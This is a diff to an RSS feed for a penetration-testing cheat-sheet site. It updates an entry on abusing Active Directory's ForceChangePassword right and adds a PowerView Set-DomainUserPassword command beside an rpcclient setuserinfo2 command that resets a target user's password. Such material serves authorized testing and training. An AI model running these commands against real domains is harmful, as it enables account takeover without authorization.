@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/forcechangepassword/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/forcechangepassword/</guid>
-      <description> ForceChangePassword rpcclient -U &amp;#39;domain/username%password&amp;#39; 10.10.11.10 -c &amp;#39;setuserinfo2 target_user 23 &amp;#34;Test123!&amp;#34;&amp;#39; </description>
+      <description> Using PowerView.ps1 . .\PowerView.ps1 Change Target User Password $pass = ConvertTo-SecureString &amp;#39;password&amp;#39; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;target_user&amp;gt; -AccountPassword $pass Using rpcclient rpcclient -U &amp;#39;domain/username%password&amp;#39; 10.10.11.10 -c &amp;#39;setuserinfo2 target_user 23 &amp;#34;password&amp;#34;&amp;#39; </description>
     </item>
   </channel>
 </rss>
